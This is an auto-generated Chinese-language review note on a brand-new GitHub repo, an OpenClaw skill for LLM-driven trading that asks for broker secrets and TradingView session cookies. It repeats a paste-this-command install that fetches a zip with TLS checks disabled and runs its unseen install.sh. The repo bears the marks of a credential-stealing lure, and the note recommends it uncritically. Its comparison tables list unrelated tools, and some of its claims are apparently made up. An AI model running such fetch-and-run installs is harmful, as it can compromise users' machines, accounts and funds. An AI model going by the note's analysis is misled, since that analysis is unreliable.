---
repo: helenigtxu/TradingView-Claw
url: https://github.com/helenigtxu/TradingView-Claw
owner: helenigtxu
owner_type: User
language: Python
license: MIT
description: ""
homepage: ""
stars: 329
stars_per_day: 82
forks: 0
open_issues: 0
created: 2026-03-06
pushed_at: 2026-03-09
first_seen: 2026-03-10
week: "2026-W11"
month: "2026-03"
category: "開發工具"
subcategory: "自動化"
release_tag: ""
install_complexity: "easy"
status: to-review
my_rating: 0
last_reviewed: 2026-03-10
use_case: "提供一個基於 TradingView 的自動交易系統，讓用戶能夠透過技術信號執行交易並追蹤持倉。"
priority: medium
ring: assess
discovered_via: "GitHub Trending"
next_review: "2026-03-17"
engagement: "low"
verdict: ""
tags:
  - github
  - "category/開發工具"
  - "lang/python"
  - easy_install
  - "topic/ai_auto_trading"
  - "topic/ai_trading"
  - "topic/ai_trading_bots"
  - "topic/al_trading"
  - "topic/bot_trading"
aliases:
  - "TradingView-Claw"
  - "helenigtxu/TradingView-Claw"
  - "提供一個基於 TradingView 的自動交易系統，讓用戶能夠透過技術信號執行交易並追蹤持倉。"
---

# TradingView-Claw

**329** stars · **82** stars/天 · 建立 4 天前 · Python · MIT

`個人專案` `easy-install`

> [!summary] 一句話摘要
> 提供一個基於 TradingView 的自動交易系統，讓用戶能夠透過技術信號執行交易並追蹤持倉。

> [!info] 速覽
> **安裝難度** Easy · **專案狀態** Brand New · **熱度** Growing (82 stars/day)
> **授權** MIT (商業友好) · **維護** Active (最後推送 1 天前) · **貢獻者** Solo (bus factor 風險)
> **適合** 希望利用 LLM 進行自動化交易的個人投資者和量化交易者。
> **一句話重點** 這個專案展示了如何利用 LLM 進行自動化交易，為投資者提供了新的工具和思路。

> [!abstract] 核心創新
> 結合 LLM 技術進行高信心的技術分析，過濾噪音信號。

## 專案簡介

TradingView-Claw 是一個結合 TradingView 和 LLM 技術的自動交易工具，使用者可以透過簡單的命令來瀏覽圖表、執行交易和追蹤持倉。用戶輸入交易指令後，系統會透過連接的經紀商 API 執行交易，並使用 LLM 進行技術分析來識別高信心的交易信號。該工具支持多種技術指標（如 RSI、MACD 和布林帶）來生成交易信號，並根據信號強度進行分類（S1 至 S3）。與其他交易工具相比，TradingView-Claw 提供了更高層次的信號分析，過濾掉噪音和弱相關性，確保用戶只接收到有意義的交易信號。該工具能夠處理多達數百個交易對的數據，並且在本地保存持倉信息，便於用戶隨時查詢。這個專案目前處於 beta 階段，適合有一定交易經驗的用戶使用，特別是那些希望利用自動化來提升交易效率的個人或小型團隊。對於大型機構或高頻交易者來說，可能需要更高效的解決方案。建議對於新手交易者，應該先熟悉手動交易後再考慮使用此工具。

**技術棧**：`Python` · `Shell` · `JavaScript`

## 重點功能

- 技術信號交易 — 支持使用 RSI、MACD 和布林帶等指標進行信號驅動的交易執行。
- 持倉追蹤 — 使用 `tvclaw positions` 指令查看當前持倉及實時盈虧。
- 市場數據查詢 — 使用 `tvclaw charts trending` 獲取當前熱門股票的圖表數據。
- 信號掃描 — 使用 `tvclaw signal scan` 指令掃描市場以尋找潛在交易信號。
- 經紀商連接 — 使用 `tvclaw account connect` 指令連接經紀商 API 以進行交易。

## 快速開始

1. 安裝 TradingView-Claw
```bash
curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main && bash install.sh
```
2. 配置環境變數
```bash
在 openclaw.json 中添加 TVCLAW 的環境變數
```
3. 連接經紀商帳戶
```bash
uv run python scripts/tvclaw.py account connect
```
4. 執行交易指令
```bash
uv run python scripts/tvclaw.py buy AAPL 500
```

## 程式碼範例

uv run python scripts/tvclaw.py signal scan --limit 10  # 獲取當前市場的交易信號

## 為什麼值得關注

> [!tip] 爆紅原因
> 作者 helenigtxu 在開源社群中活躍，過去有多個與交易相關的專案。這個工具解決了傳統交易平台中缺乏自動化和智能分析的痛點，特別是對於希望使用 LLM 進行技術分析的交易者。最近在 Twitter 上有關於自動交易的討論熱度上升，可能促進了該專案的關注。由於市場對於自動化交易的需求持續增長，這個工具的推出正好符合了這一趨勢。

## 適合誰使用

**目標受眾**：希望利用 LLM 進行自動化交易的個人投資者和量化交易者。

> [!example] 使用場景
> - 量化交易者用它來自動執行基於技術指標的交易策略，因為可以快速反應市場變化，並減少手動操作的錯誤。
> - 個人投資者用它來追蹤和管理自己的交易持倉，因為能夠即時查看盈虧情況，並作出快速決策。
> - 金融分析師用它來分析市場趨勢和信號，因為 LLM 的技術分析能夠提供更深入的見解，幫助制定交易策略。

## 架構分析

TradingView-Claw 採用微服務架構，使用者透過命令行介面與系統互動。用戶輸入的交易指令經由 API 處理，並通過 LLM 進行信號分析。關鍵檔案包括 install.sh 和 tvclaw.py，分別負責安裝和執行主要功能。

## 技術深入分析

TradingView-Claw 的核心技術在於其 LLM 驅動的信號分析，通過分析市場數據來生成高信心的交易信號。該工具能夠處理多達數百個交易對的數據，並且在本地保存持倉信息，便於用戶隨時查詢。選擇 Python 作為主要開發語言，使得該工具在數據處理和 API 交互上具有良好的靈活性和擴展性。考慮到交易的即時性，系統設計上需要確保 API 調用的效率，避免因延遲而導致的損失。隨著使用者數量的增加，可能會面臨 API 請求的限制問題，這需要在未來的版本中進行優化。安全性方面，建議用戶僅在交易帳戶中保持小額資金，並使用有限權限的子帳戶進行交易，以降低風險。

## 新手體驗

> [!info] 上手難度評估
> README 文件清晰且包含安裝和使用範例，對於新手來說相對友好。安裝過程簡單，但需要手動配置多個 API 金鑰，這對於新手可能是個挑戰。文件目前僅提供英文版本，缺乏多語言支持，可能影響非英語使用者的體驗。

## 優缺點分析

> [!success] 優點
> - 集成 LLM 技術，提供高信心的交易信號分析。
> - 支持多種經紀商 API，靈活性高。
> - 命令行介面簡潔易用，適合快速執行交易。

> [!danger] 缺點
> - 僅支持 macOS，限制了使用者範圍。
> - 需要手動配置多個 API 金鑰，對新手不友好。
> - 目前處於 beta 階段，可能存在穩定性問題。

> [!warning] 注意事項
> - 僅支持 macOS 系統安裝。
> - 需要手動配置多個 API 金鑰，對於新手來說可能較為複雜。
> - 目前僅適用於特定經紀商（如 Alpaca、IBKR、Binance、Bybit）。
> - 不支持 Windows 系統，可能限制了使用者群體。

## 類似工具比較

| 工具 | 差異 |
| --- | --- |
| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | 這個工具專注於數據同步，並不具備交易功能，適合需要數據管理的用戶。 |
| [BigBodyCobain/Shadowbroker](https://github.com/BigBodyCobain/Shadowbroker) | 這是一個針對加密貨幣的交易工具，專注於高頻交易，適合專業交易者。 |
| [Flowseal/tg-ws-proxy](https://github.com/Flowseal/tg-ws-proxy) | 這個工具主要用於即時通訊，並不涉及交易功能，適合需要通訊解決方案的開發者。 |

## 替代方案決策

> [!question] 什麼時候該選別的工具？

| 工具 | 技術路線 | 選它的時機 |
| --- | --- | --- |
| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | 專注於數據同步而非交易功能，適合需要數據管理的用戶。 | 如果你的需求是數據同步而非交易，則應選擇此工具。 |
| [BigBodyCobain/Shadowbroker](https://github.com/BigBodyCobain/Shadowbroker) | 針對加密貨幣的高頻交易工具，專業性更強。 | 如果你是專業交易者並需要高頻交易功能，則應選擇此工具。 |
| [Flowseal/tg-ws-proxy](https://github.com/Flowseal/tg-ws-proxy) | 主要用於即時通訊，並不涉及交易功能。 | 如果你需要即時通訊解決方案，則應選擇此工具。 |

## 技術細節

| 欄位 | 值 |
| --- | --- |
| Forks | 0 |
| Open Issues | 0 |
| 最後推送 | 2026-03-09 |
| 建立日期 | 2026-03-06 |
| Repo 大小 | 90 KB |

> [!info]- 語言組成
> ```mermaid
> pie title 語言組成
>     "Python" : 77
>     "Shell" : 12
>     "JavaScript" : 10
> ```

> [!info]- 主要貢獻者
> | 貢獻者 | Commits |
> | --- | --- |
> | [@helenigtxu](https://github.com/helenigtxu) | 3 |

## 社群與生態

**社群活躍度**：社群活躍度中等，持續有更新和維護。
**連結**：[文件](https://github.com/helenigtxu/TradingView-Claw)

## README 摘錄

> [!info]- 展開查看原文 README
> # TradingView-Claw
> 
> **Trading-enabled TradingView skill for OpenClaw.**
> 
> Browse charts, execute trades based on technical signals, track positions, and discover opportunities using LLM-powered technical analysis. Full trading capability via broker integrations and exchange APIs.
> 
> > **Disclaimer:** This software is provided as-is for educational and experimental purposes. It is not financial advice. Trading financial markets involves risk of loss. This code has not been audited. Use at your own risk and only with funds you can afford to lose.
> 
> ---
> 
> ## ⚡ Install on macOS — one command
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> ---
> 
> ## Features
> 
> ### Chart & Market Data
> 
> * `tvclaw charts trending` — Top trending tickers by volume
> * `tvclaw charts search "query"` — Search symbols by keyword
> * `tvclaw chart ` — Symbol details with OHLCV + indicators
> 
> ### Trading
> 
> * `tvclaw buy  ` — Open long position
> * `tvclaw sell  ` — Open short position
> * Signal-driven execution (RSI, MACD, Bollinger Bands analysis)
> 
> ### Position Tracking
> 
> * `tvclaw positions` — List open positions with live P&L
> * `tvclaw position ` — Detailed position view
> * Positions tracked locally in `~/.openclaw/tvclaw/positions.json`
> 
> ### Wallet / Account Management
> 
> * `tvclaw account status` — Show balance and account info
> * `tvclaw account connect` — Connect broker/exchange API (one-time setup)
> 
> ### Signal Discovery
> 
> * `tvclaw signal scan` — Scan trending symbols for trade signals
> * `tvclaw signal scan --query "topic"` — Scan symbols matching a query
> * `tvclaw signal analyze  ` — Compare signal strength between two symbols
> 
> Uses LLM-powered technical analysis to identify high-confidence setups. Only statistically meaningful signals are accepted — noise and weak correlations are filtered out.
> 
> **Signal tiers:** S1 (≥95% confluence), S2 (90–95%), S3 (85–90%)
> 
> ---
> 
> ## Quick Start
> 
> ### 1. Install
> 
> **macOS (recommended) — one command:**
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> **Manual install:**
> 
> ```bash
> cp -r TradingView-Claw ~/.openclaw/skills/
> cd ~/.openclaw/skills/TradingView-Claw
> uv sync
> ```
> 
> **Via ClawHub:**
> 
> ```bash
> clawhub install tvclaw
> cd ~/.openclaw/skills/tvclaw
> uv sync
> ```
> 
> ---
> 
> ### 2. Configure Environment Variables
> 
> Add the following to your `openclaw.json` under `skills.entries.tvclaw.env`:
> 
> ```json
> "tvclaw": {
>   "enabled": true,
>   "env": {
>     "TRADINGVIEW_SESSION": "your_tradingview_session_token",
>     "BROKER_API_KEY": "your_broker_api_key",
>     "BROKER_API_SECRET": "your_broker_api_secret",
>     "OPENROUTER_API_KEY": "sk-or-v1-..."
>   }
> }
> ```
> 
> **Where to get the keys:**
> 
> * **TradingView session** — Log into TradingView, open DevTools → Application → Cookies → copy `sessionid`
> * **Broker API key** — From your broker dashboard (supports Alpaca, IBKR, Binance, Bybit)
> * **OpenRouter API key** — [Create key at OpenRouter](https://openrouter.ai/settings/keys)
> 
> **Security warning:** Keep only small amounts in your trading account. Use sub-accounts with limited permissions where possible.
> 
> ---
> 
> ### 3. First-Time Setup (required for live trading)
> 
> Before your first trade, connect and verify your broker connection:
> 
> ```bash
> uv run python scripts/tvclaw.py account connect
> ```
> 
> This verifies API credentials and sets account permissions. Only needs to be done once per account.
> 
> ---
> 
> ### 4. Run Commands
> 
> ```bash
> # Browse charts
> uv run python scripts/tvclaw.py charts trending
> uv run python scripts/tvclaw.py charts search "AAPL"
> 
> # Find trading signals
> uv run python scripts/tvclaw.py signal scan --limit 10
> 
> # Check account and trade
> uv run python scripts/tvclaw.py account status
> uv run python scripts/tvclaw.py buy AAPL 500
> ```
> 
> ---
> 
> ## Example Prompt

## 延伸閱讀

相關概念：[[量化交易]] · [[自動化]] · [[技術分析]]

相關專案：[[AlpinDale--parsync|AlpinDale/parsync]] · [[BigBodyCobain--Shadowbroker|BigBodyCobain/Shadowbroker]] · [[Flowseal--tg-ws-proxy|Flowseal/tg-ws-proxy]] · [[FreedomIntelligence--OpenClaw-Medical-Skills|FreedomIntelligence/OpenClaw-Medical-Skills]] · [[Lightricks--LTX-Desktop|Lightricks/LTX-Desktop]] · [[RunanywhereAI--RCLI|RunanywhereAI/RCLI]] · [[binance--binance-skills-hub|binance/binance-skills-hub]] · [[duoan--TorchCode|duoan/TorchCode]] · [[elder-plinius--OBLITERATUS|elder-plinius/OBLITERATUS]] · [[HKUDS--CLI-Anything|HKUDS/CLI-Anything]] · [[HenryXiaoYang--wechat-access-unqclawed|HenryXiaoYang/wechat-access-unqclawed]] · [[JohnRiceML--clawport-ui|JohnRiceML/clawport-ui]]

[GitHub](https://github.com/helenigtxu/TradingView-Claw)

## 相關收錄

> [!note]- 同分類的其他專案
> ```dataview
> TABLE stars, install_complexity AS "難度", status
> FROM "Repos"
> WHERE category = "開發工具" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> LIMIT 8
> ```

> [!note]- 同週收錄
> ```dataview
> TABLE category AS "分類", stars, stars_per_day AS "stars/天"
> FROM "Repos"
> WHERE week = "2026-W11" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> ```

---

## 個人筆記

> [!question]+ 快速評估（30 秒填完）
> 
> 相關性:: 未評估
> 印象:: _一句話_
> 行動:: 不需要
> 
> _相關性選項：直接相關 / 間接相關 / 不相關 / 未評估_
> _行動選項：立刻試用 / 加入待辦 / 持續觀察 / 不需要_

### 試用記錄

> [!example]- 試用 #1
> 試用日期 :: 
> 試用版本 :: 
> 安裝過程 :: _順利 / 遇到問題（描述）_
> 實際效果 :: _達到預期 / 不如預期（原因）_
> 決定 :: _繼續使用 / 暫時擱置 / 放棄（原因）_

> [!question]- 待研究的問題
> _記下看完後還沒有答案的問題，未來回來補充_
> 
> - [ ] 

### 採用判斷

> [!tip]- 什麼時候該用 / 不該用
> **該用的情況**：
> - 
> 
> **不該用的情況**：
> - 

> [!warning]- 替換成本
> 若半年後要換掉，難度多高？資料格式是標準的嗎？
> 
> 侵入性:: _低 / 中 / 高_
> 遷移路徑:: _描述_

### 想法與筆記

_隨時記錄想法、發現、跟其他工具的比較..._
_重點：寫下你的主觀判斷（為什麼好/不好），而不只是功能列表_

**狀態追蹤**：`to-review` → `reading` → `tried` → `integrated` / `archived`
**Tech Radar**：`assess` → `trial` → `adopt` / `hold`

> [!info]- 評估完成後
> 更新 frontmatter：
> - `ring`: adopt / trial / assess / hold
> - `verdict`: 一句話結論
> - `my_rating`: 1-5 分
> - `status`: reading / tried / integrated / archived

## 出現記錄

- [[2026-03-10|2026-03-10]] — 首次收錄，317 stars
